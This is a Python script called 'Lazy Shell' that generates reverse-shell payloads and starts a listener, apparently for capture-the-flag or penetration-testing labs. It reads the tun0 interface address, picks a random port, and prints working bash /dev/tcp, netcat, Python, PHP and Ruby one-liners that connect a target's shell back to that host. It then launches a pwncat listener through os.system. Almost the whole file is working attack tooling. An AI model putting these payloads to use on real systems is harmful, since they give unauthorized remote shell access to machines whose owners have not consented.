#!/usr/bin/env python
import netifaces
import os
import random


# Networking Variables
# eth0 = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
tun0 = netifaces.ifaddresses("tun0")[netifaces.AF_INET][0]["addr"]
ip = tun0
port_list = [
    4444,
    4200,
    6969,
    7777,
    8675,
    9110,
    3456,
    6789,
    8181,
    4545,
    5656,
    4745,
    3985,
    2580,
    3099,
]
port = random.choice(port_list)


# Shell Variables
# Bash Shell
bash = f"""
     ---------------------------------------------------------------

     Bash Shell: bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
  
     ---------------------------------------------------------------

"""
# Netcat Shell
nc = f"""
     --------------------------------------------

     Netcat Shell: nc -e /bin/sh {ip} {port}
     
     --------------------------------------------

"""
# Python Shell
python = f"""
     -----------------------------------------------------------------------------------------------------------------------------------------

     Python Shell: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));
     os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

     -----------------------------------------------------------------------------------------------------------------------------------------

"""
# PHP Shell
php = f"""
     ----------------------------------------------------------------------------------------

     PHP Shell: php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
     
     ----------------------------------------------------------------------------------------

"""
# Ruby Shell
ruby = f"""
    ___________________________________________________________________________________________________________________________

     Ruby Shell: Sruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
     
    ___________________________________________________________________________________________________________________________

"""
all_shells = bash + nc + python + php + ruby


# PwnCat Settings
# Default Listener
listen = f"rlwrap pwncat -vv -l {port}"
conf = f"LISTENER STARTED ON PORT: {port}"


menu = """
   ----------------
      Lazy Shell
   ----------------
   Author: 0xRoman1


  ___________* Options *____________
  ----------------------------------
  1) Automatic Bash Reverse Shell

  2) Automatic Netcat Reverse Shell

  3) Automatic Python Reverse Shell

  4) Authomatic PHP Reverse Shell

  5) Authomatic Ruby Reverse Shell

  6) List All Reverse Shell's
  ----------------------------------
"""


def main():
    os.system("clear")
    print(menu)
    selection = "0"
    while selection == "0":
        selection = input("  Select an Option: ")

        if selection == "6":
            os.system("clear")
            print(all_shells)
            print(conf)
            os.system(listen)
        elif selection == "5":
            os.system("clear")
            print(ruby)
            print(conf)
            os.system(listen)
        elif selection == "4":
            os.system("clear")
            print(php)
            print(conf)
            os.system(listen)
        elif selection == "3":
            os.system("clear")
            print(python)
            print(conf)
            os.system(listen)
        elif selection == "2":
            os.system("clear")
            print(nc)
            print(conf)
            os.system(listen)
        elif selection == "1":
            os.system("clear")
            print(bash)
            print(conf)
            os.system(listen)
        else:
            print("Invalid Selection, Please Try Again.")


main()
